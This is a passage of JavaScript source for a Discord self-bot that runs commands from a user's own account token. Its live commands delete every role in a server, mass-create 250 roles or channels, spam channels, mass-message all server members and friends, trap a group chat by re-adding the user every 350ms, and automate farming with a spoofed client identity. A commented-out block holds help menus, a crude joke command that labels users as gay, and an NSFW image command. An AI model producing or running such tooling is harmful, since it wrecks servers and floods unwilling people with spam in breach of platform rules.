            case "clearrole":
                message.guild.roles.cache.forEach(role => {
                    console.log(`${lang.roledelete1}`.yellow + role.name)
                    role.delete()
                })
                autoDeleteMiddleware(config)(message)
                break

            case "massrole":
                var sayMessage = message.content.split(" ").slice(1)
                if(!sayMessage) return message.edit(`${lang.notext}`);
                for (var i = 0; i < 250; i++) {
                    message.guild.roles.create({
                        data: {name: sayMessage,color: 'RANDOM',},
                    })}
                autoDeleteMiddleware(config)(message)
                break

            case "masschannel":
                var sayMessage = message.content.split(" ").slice(1).join(" ");
                if (!sayMessage) return message.edit(`${lang.notext}`);
                if (typeof sayMessage !== "string") return message.edit(`${lang.invalidtext}`);
                for (var i = 0; i < 250; i++) {
                    message.guild.channels.create(sayMessage, {type: 'text'});
                }
                autoDeleteMiddleware(config)(message);
                break

            case "showsessions":
                var confirmationMessage = await message.edit(`\`\`\`ini
[ ${lang.warning1} ]: 
                                        
${lang.activesession1}
                                        \`\`\``)
                try {
                    var filter = m => (m.author.id === message.author.id) && (["continue", "cancel"].includes(m.content.toLowerCase()))
                    var userResponse = await message.channel.awaitMessages({ filter, max: 1, time: 15000, errors: ['time'] })
                    if (userResponse.first().content.toLowerCase() === "cancel") {
                        return confirmationMessage.edit(`${lang.ordercanceled1}`)
                    } else {
                        await userResponse.first().delete()
                    }
                } catch (err) {
                    return confirmationMessage.edit(`${lang.expiration1}`)
                }
                var body = await fetch("https://discord.com/api/v9/auth/sessions", {headers: {authorization: client.token, "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) phrogcord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36", 'X-super-properties': Buffer.from('{"os":"Windows","browser":"Discord Client","release_channel":"stable","client_version":"0.1.9","os_version":"10.0.22000","os_arch":"x64","system_locale":"fr","client_build_number":164806,"client_event_source":null}').toString('base64')}})
                body = await body.json()
                var toSend = ""
                for (var p of body.user_sessions) toSend += `ID Hash: ${p.id_hash}\n ${lang.lasttime1} ${p.approx_last_used_time}\nOS: ${p.client_info.os}\nPlatform: ${p.client_info.platform}\nLocation: ${p.client_info.location}\n\n`
                message.edit("\`\`\`ini\n" + toSend + "\`\`\`")
                autoDeleteMiddleware(config)(message)
                break

            case "tacoshack":
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Auto Farm ]

+ ${lang.autofarm1}
                                    \`\`\``);
                message.channel.sendSlash('490707751832649738', 'work')
                message.channel.sendSlash('490707751832649738', 'tips')
                message.channel.sendSlash('490707751832649738', 'overtime')
                setInterval(() => {
                    message.channel.sendSlash('490707751832649738', 'work')
                }, 660000)
                setInterval(() => {
                    message.channel.sendSlash('490707751832649738', 'tips')
                }, 360000);
                setInterval(() => {
                    message.channel.sendSlash('490707751832649738', 'overtime')
                }, 1860000)
                autoDeleteMiddleware(config)(message)
                break

            case "taconofrench":
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Auto Farm ]

+ ${lang.autofarm1}
                                    \`\`\``);
                message.channel.sendSlash('490707751832649738', 'work')
                message.channel.sendSlash('490707751832649738', 'tips')
                setInterval(() => {
                    message.channel.sendSlash('490707751832649738', 'work')
                }, 660000)
                setInterval(() => {
                    message.channel.sendSlash('490707751832649738', 'tips')
                }, 360000);
                autoDeleteMiddleware(config)(message)
                break

            case "spoofstatus":
                spoofStatus()
                autoDeleteMiddleware(config)(message)
                break

            case "branlette":
                var emotes = [
                    "8=:fist:==D ",
                    "8==:fist:=D ",
                    "8===:fist:D ",
                    "8==:fist:=D ",
                    "8=:fist:==D ",
                    "8:fist:===D ",
                    "8=:fist:==D ",
                    "8==:fist:=D ",
                    "8===:fist:D ",
                    "8===:fist:D:sweat_drops: ",
                ];
                emotes.forEach((emote) => {
                    message.edit(emote);
                    sleep(1000);
                });
                break

            case "leavehype":
                client.user.setHypeSquad(0)
                autoDeleteMiddleware(config)(message)
                break

            case "invitechannel":
                var id = message.content.split(" ").slice(1).join(" ")
                if (!id) return message.edit(`${lang.noid}`)
                message.edit(`> ${client.user.username} ${lang.invitechannel}

                                      > ${lang.invitechannel2} <#${id}>`)
                break

            case "groupfucker":
                var groupid = message.channel.id;
                setInterval(async () => {
                    try {
                        await fetch(`https://discord.com/api/v9/channels/${groupid}/recipients/${client.user.id}`, {
                            method: 'PUT',
                            headers: {
                                'Accept': '*/*',
                                'Authorization': client.token,
                            },
                        });
                        message.edit("**__🔒Group Locked🔒__**");
                    } catch (error) {
                        console.error(error);
                    }
                }, 350);
                break

            case "dmfriends":
                fetch('https://discordapp.com/api/users/@me/relationships', {headers: {authorization: client.token}})
                    .then(res => res.json())
                    .then(data => {
                        const friendIds = data.map(user => user.id);
                        const message = message.content.split(" ").slice(1).join(" ")
                        if (!message) {
                            message.edit(`${lang.providemsg}`)
                        }
                        friendIds.forEach((friendId, index) => {
                            setTimeout(() => {fetch(`https://discordapp.com/api/users/@me/channels`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                    'Authorization': client.token
                                },
                                body: JSON.stringify({
                                    recipients: [friendId],
                                    content: message
                                })
                            })
                                .then(res => res.json())
                                .then(channel => {
                                    fetch(`https://discordapp.com/api/channels/${channel.id}/messages`, {
                                        method: 'POST',
                                        headers: {
                                            'Content-Type': 'application/json',
                                            'Authorization': client.token
                                        },
                                        body: JSON.stringify({
                                            content: message
                                        })
                                    })
                                        .then(res => res.json())
                                        .then(message => {
                                            message.edit(`${lang.dmfriends}`)
                                        })
                                        .catch(error => {
                                            console.error(`Error ${friendId}`);
                                        });
                                })
                                .catch(error => {
                                    console.error(`Error ${friendId}`);
                                });
                            });
                        });
                    });
                break

            case "dmserver":
                var content = message.content.split(" ").slice(1).join(" ");

                if (!content) {
                    message.edit(`${lang.providemsg}`);
                    break;
                }



                message.guild.members.fetch().then(members => {
                    members.each((member, index) => {
                        setTimeout(() => {
                            member.send(content)
                                .then(() => {
                                    message.edit(`${lang.dmserver}`)
                                })
                                .catch(error => {
                                    console.error(`Impossible d'envoyer un message à ${member.user.tag}`, error);
                                });
                        });
                    });
                });
                break

            case "customstatusspoof":
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Custom Status Spoof ]

ON
                                            \`\`\``)
                setInterval(() => {
                    var status = spoofcustomstatus.status;
                    var emoji = spoofcustomstatus.emoji;

                    var previousStatus = null;
                    var previousEmoji = null;

                    function getRandomStatus() {
                        var randomStatusIndex = Math.floor(Math.random() * status.length);
                        var randomStatus = status[randomStatusIndex];

                        if (randomStatus === previousStatus) {
                            return getRandomStatus();
                        }

                        previousStatus = randomStatus;
                        return randomStatus;
                    }

                    function getRandomEmoji() {
                        var randomEmojiIndex = Math.floor(Math.random() * emoji.length);
                        var randomEmoji = emoji[randomEmojiIndex];

                        if (randomEmoji === previousEmoji) {
                            return getRandomEmoji();
                        }

                        previousEmoji = randomEmoji;
                        return randomEmoji;
                    }

                    var randomStatus = getRandomStatus();
                    var randomEmoji = getRandomEmoji();

                    client.settings.setCustomStatus({
                        status: spoofcustomstatus.pointstatus,
                        text: randomStatus,
                        emoji: `${randomEmoji}`,
                        expires: null,
                    });
                }, 3000);
                autoDeleteMiddleware(config)(message)
                break

            case "spam":
                setInterval(() => {
                        message.channel.send(`:chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: `)
                    }
                    , 1000)
                break















        }})})
/*                             } else {
    client.on("messageCreate", async (message) => {
    if (!message.content.startsWith(prefix)) return
    if (message.author.id !== client.user.id) return
    var args = message.content.substring(prefix.length).split(" ")
    console.log(gradient.instagram(`Command executed : ${args[0]}`))
         */

/*
   _____                                          _
  / ____|                                        | |
 | |     ___  _ __ ___  _ __ ___   __ _ _ __   __| | ___
 | |    / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` |/ _ \
 | |___| (_) | | | | | | | | | | | (_| | | | | (_| |  __/
  \_____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|\___|
*/
/*     switch (args[0]) {
        case "help":
            message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ | Free Selfbot ]

<> = ${lang.required} | [] = ${lang.optional}

[ ${prefix}help ] ${lang.help}
[ ${prefix}image ] ${lang.image}
[ ${prefix}text ] ${lang.text}
[ ${prefix}tools ] ${lang.tools}
[ ${prefix}nsfw ] ${lang.nsfw}
[ ${prefix}fun ] ${lang.fun}
[ ${prefix}settings ] ${lang.settings}

Code: PЯØJΞCƬ | Free Selfbot
            \`\`\``)
            autoDeleteMiddleware(config)(message)
            break

        case "image":
            message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ | Free Selfbot ]

<> = ${lang.required} | [] = ${lang.optional}

[ ${prefix}cat ] ${lang.cat}
[ ${prefix}dog ] ${lang.dog}
[ ${prefix}avatar ] ${lang.avatar}
[ ${prefix}tweet <message> ] ${lang.tweet}

Code: PЯØJΞCƬ | Free Selfbot
            \`\`\``)
            autoDeleteMiddleware(config)(message)
            break
        case "tools":
            message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ | Free Selfbot ]

<> = ${lang.required} | [] = ${lang.optional}

${lang.tools}

[ ${prefix}serverinfo [serverid] ] ${lang.serverinfo}
[ ${prefix}inviteinfo <invite> ] ${lang.inviteinfo}

Code: PЯØJΞCƬ | Free Selfbot
                \`\`\``)
                autoDeleteMiddleware(config)(message)
                break

        case "text":
            message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ | Free Selfbot ]

<> = ${lang.required} | [] = ${lang.optional}

[ ${prefix}space ] ${lang.space}
[ ${prefix}ascii ] ${lang.ascii}
[ ${prefix}encode ] ${lang.encode}

Code: PЯØJΞCƬ | Free Selfbot
            \`\`\``)
            autoDeleteMiddleware(config)(message)
            break

        case "nsfw":
            message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ | Free Selfbot ]

<> = ${lang.required} | [] = ${lang.optional}

[ ${prefix}ass ] ${lang.ass}

Code: PЯØJΞCƬ | Free Selfbot
            \`\`\``)
            autoDeleteMiddleware(config)(message)
            break

        case "fun":
            message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ | Free Selfbot ]

<> = ${lang.required} | [] = ${lang.optional}

[ ${prefix}gay ] ${lang.gay}
[ ${prefix}iq ] ${lang.iq}
[ ${prefix}joke ] ${lang.joke}

Code: PЯØJΞCƬ | Free Selfbot
            \`\`\``)
            autoDeleteMiddleware(config)(message)
            break

        case "settings":
            message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ | Free Selfbot ]

<> = ${lang.required} | [] = ${lang.optional}

[ ${prefix}prefix ] ${lang.prefix}
[ ${prefix}lang ] ${lang.lang}

Code: PЯØJΞCƬ | Free Selfbot
            \`\`\``)
            autoDeleteMiddleware(config)(message)
            break

            case "lang":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.enterlang}`);
                if (args[0] !== "fr" && args[0] !== "eng" && args[0] !== "deu") return message.edit(`${lang.invalidlang}`);
                config.language = args[0];
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                message.edit(`\`\`\`ini
              [ Code: PЯØJΞCƬ - Lang Config ]

              + ${lang.langset}
                \`\`\``);
                autoDeleteMiddleware(config)(message);
                break

                case "prefix":
                    var args = message.content.split(" ").slice(1);
                    if (!args[0]) return message.edit(`${lang.enterprefix}`);
                    config.prefix = args[0]
                    fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                    message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Prefix Config ]

+ ${lang.prefixset}
                \`\`\``);
                    autoDeleteMiddleware(config)(message)
                    break

                case "gay":
                    var mentionuser = message.mentions.users.first();
                    if(!mentionuser) return message.edit(`${lang.mentionuser}`);
                    var reponse;
                    var args = message.content.split(" ");
                    if (args.length > 2) {
                        reponse = args[2] + "%";
                    } else {
                        reponse = Math.round(Math.random() * 100) + "%";
                    }
                    if (mentionuser.id === "443736172183814145" || mentionuser.id === "795785229699645491") reponse = "0%";
                    message.edit(`:rainbow_flag: ${mentionuser.username} ${lang.gay1} **${reponse}**`)
                    break

                case "iq":
                    var mentionuser = message.mentions.users.first()
                    if(!mentionuser) return message.edit(`${lang.mentionuser}`)
                    var args = message.content.split(" ")
                    var iq
                        if (args.length > 2) {
                            iq = parseInt(args[2], 10);
                    } else {
                            iq = Math.round(Math.random() * 200);
                    }
                    message.edit(`:brain: ${lang.testiq1} : **${mentionuser.username}**\n IQ : ${iq}`)
                    break

                    case "joke":
                        fetch("https://official-joke-api.appspot.com/random_joke")
                        .then(res => res.json())
                        .then(json => {
                            const setup = json.setup;
                            const punchline = json.punchline;
                            message.edit(`\`\`\`ini
${lang.joke1} :

[${setup}]\n\n[${punchline}]\`\`\``)})
                            break

                    case "ass":
                        var image = await nsfw.ass()
                            message.edit(`${message.author} ${lang.ass1} : 😘\n${image}`)
                            break

                    case "ascii":
                        var args = message.content.split(" ").slice(1).join(" ")
                            if (!args) {return message.edit(`${lang.providemsg}`)}
                            var ascii = args.replace(/a/g, "𝔞").replace(/b/g, "𝔟").replace(/c/g, "𝔠").replace(/d/g, "𝔡").replace(/e/g, "𝔢").replace(/f/g, "𝔣").replace(/g/g, "𝔤").replace(/h/g, "𝔥").replace(/i/g, "𝔦").replace(/j/g, "𝔧").replace(/k/g, "𝔨").replace(/l/g, "𝔩").replace(/m/g, "𝔪").replace(/n/g, "𝔫").replace(/o/g, "𝔬").replace(/p/g, "𝔭").replace(/q/g, "𝔮").replace(/r/g, "𝔯").replace(/s/g, "𝔰").replace(/t/g, "𝔱").replace(/u/g, "𝔲").replace(/v/g, "𝔳").replace(/w/g, "𝔴").replace(/x/g, "𝔵").replace(/y/g, "𝔶").replace(/z/g, "𝔷")
                            message.edit(ascii)
                            autoDeleteMiddleware(config)(message)
                            break

                    case "encode":
                        var args = message.content.split(" ").slice(1).join(" ")
                        if (!args) {return message.edit(`${lang.providemsg}`)}
                        var encoded = Buffer.from(args).toString('base64')
                        message.edit(encoded)
                        autoDeleteMiddleware(config)(message)
                        break

                    case "space":
                        var args = message.content.split(" ").slice(1).join(" ")
                        if (!args) {return message.edit(`${lang.providemsg}`)}
                        var spaced = args.split("").join(" ")
                        message.edit(spaced)
                        autoDeleteMiddleware(config)(message)
                        break

                    case "tweet":
                        var args = message.content.split(" ").slice(1).join(" ")
                            if (!args) {return message.edit(`${lang.providemsg}`)}
                        var response = await fetch(`https://nekobot.xyz/api/imagegen?type=tweet&username=${message.author.username}&text=${args}`)
                        var json = await response.json()
                            message.delete()
                        message.channel.send(`${lang.hereis}`)
                        message.channel.send({files: [{attachment: json.message, name: "tweet.png"}]})
                        break

                    case "serverinfo":
                            let guild
                            if (args.length > 1) {
                              guild = client.guilds.cache.find(g => g.id === args[1]);
                            } else {
                              guild = message.guild;
                            }
                            if (!guild) {
                              return message.reply(`${lang.cannotfindtarget}`)
                            }
                            let serverInfo = {
                              'ID': guild.id,
                              'Name': guild.name,
                              'Owner': guild.owner ? guild.owner.user.tag : "unknown",
                              'Owner ID': guild.ownerId,
                              'Member Count': guild.memberCount,
                              'Bots': guild.members.cache.filter(member => member.user.bot).size,
                              'Roles': guild.roles.cache.size,
                              'Total Boosts': guild.premiumSubscriptionCount,
                              'Boost Level': guild.premiumTier,
                              'Text Channels': guild.channels.cache.filter(channel => channel.type === 'GUILD_TEXT').size,
                              'Voice Channels': guild.channels.cache.filter(channel => channel.type === 'GUILD_VOICE').size,
                              'Categories': guild.channels.cache.filter(channel => channel.type === 'GUILD_CATEGORY').size,
                              'Verification Level': guild.verificationLevel,
                              'Large Guild': guild.large ? 'True' : 'False',
                            }
                            let serverInfoStr = ""
                            for (const property in serverInfo) {
                              serverInfoStr += `[${property}] ${serverInfo[property]}\n`
                            }
                            message.edit(`\`\`\`ini\n${serverInfoStr}\`\`\``)
                        break

                    case "inviteinfo":
                        var invite = args[1]
                        if (!invite) return message.edit(`${lang.noinvite}`);
                        var inviteinfo = await client.fetchInvite(invite)
                        message.edit(`\`\`\`ini
[Invite Information] :

Invite Code : ${inviteinfo.code}\n
Invite Guild : ${inviteinfo.guild.name}\n
Inviter : ${inviteinfo.inviter.username}\n
Invite Expires on : ${inviteinfo.expiresAt}\n
\`\`\``)
                        break */


/*     })} */
